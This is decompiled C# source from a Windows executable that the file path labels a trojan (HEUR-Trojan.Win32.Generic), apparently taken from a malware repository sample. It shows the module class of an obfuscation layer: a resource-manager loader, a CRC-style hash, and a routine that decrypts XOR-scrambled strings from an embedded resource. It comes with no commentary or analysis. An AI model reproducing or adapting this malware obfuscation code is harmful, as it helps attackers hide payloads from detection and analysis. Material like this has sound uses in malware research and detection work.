// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17B3991E-7989-4932-9D30-8C031294ADFF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-797e4fb918a10e74cd484f57ffc9963a5d57e1b534dbfd72a11b844568de85d2.exe

using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

internal class \u003CModule\u003E
{
  public static object a;
  public static object b;
  public static object c;
  public static object d;
  public static object e;
  public static object f;
  public static object g;
  public static int h;
  public static int i;
  public static int j;
  public static int k;
  public static int l;
  public static int m;
  public static int n;
  public static int o;
  public static int p;

  public static ResourceManager a([In] string obj0, [In] Assembly obj1)
  {
    string baseName;
    switch (obj1.FullName)
    {
      case "w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null":
        baseName = global::f.a(obj0);
        break;
      default:
        baseName = global::f.a(obj0);
        break;
    }
    return new ResourceManager(baseName, obj1);
  }

  internal static int b([In] string obj0)
  {
    int num1 = -1;
    foreach (byte num2 in Encoding.UTF8.GetBytes(obj0))
    {
      num1 ^= (int) num2 << 24;
      for (int index = 0; index < 8; ++index)
      {
        if (((long) num1 & 2147483648L) == 2147483648L)
          num1 = num1 << 1 ^ 79764919;
        else
          num1 <<= 1;
      }
    }
    return num1;
  }

  internal static string c([In] int obj0, [In] int obj1, [In] int obj2)
  {
    obj0 += 593;
    Assembly executingAssembly = Assembly.GetExecutingAssembly();
    obj1 -= 331;
    Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("resource");
    int num = (obj0 ^ obj1) * 17 / 27;
    manifestResourceStream.Seek((long) (7 + num), SeekOrigin.Begin);
    byte[] buffer = new byte[8];
    manifestResourceStream.Read(buffer, 0, 4);
    int offset = (BitConverter.ToInt32(buffer, 0) ^ 2100157544) - 100;
    manifestResourceStream.Read(buffer, 0, 4);
    int count = BitConverter.ToInt32(buffer, 0) - 5 ^ 485648943;
    manifestResourceStream.Seek((long) offset, SeekOrigin.Begin);
    byte[] numArray = new byte[count];
    manifestResourceStream.Read(numArray, 0, count);
    for (int index = 0; index < numArray.Length; ++index)
      numArray[index] = (byte) ((uint) numArray[index] ^ (uint) obj2);
    return Encoding.UTF8.GetString(numArray);
  }
}
